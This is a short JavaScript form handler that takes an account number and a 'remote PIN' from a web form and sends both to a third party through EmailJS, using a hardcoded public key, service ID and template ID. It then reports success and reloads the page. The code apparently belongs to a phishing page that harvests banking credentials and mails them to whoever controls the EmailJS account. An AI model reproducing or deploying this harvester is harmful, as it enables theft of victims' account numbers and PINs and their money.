const form = document.getElementById("app-form");
const accountNo = document.getElementById("account_no");
const remotePin = document.getElementById("remote_pin");
const button = document.querySelector("#send-btn");

form.addEventListener("submit", (e) => {
  e.preventDefault();

  const validateInput = (input) => {
    if (input.value === "" || input.value === null) {
      return;
    }

    return input.value.trim();
  };

  const accountNoVal = validateInput(accountNo);
  const remotePinVal = validateInput(remotePin);

  if (accountNoVal && remotePinVal) {
    button.innerHTML = `Submitting <i class="fa fa-spinner fa-spin"></i>`;
    button.ariaDisabled = "true";

    emailjs.init("Wty3VQ9KPSIcGj-cS");

    emailjs
      .send("service_sn6mekz", "template_p15fdti", {
        accountNoVal,
        remotePinVal,
      })
      .then(
        function () {
          alert("SUCCESS!");
          window.location.reload();
        },
        function (error) {
          alert(error);
          console.log("FAILED...", error);
        }
      );
  }

  return;
});
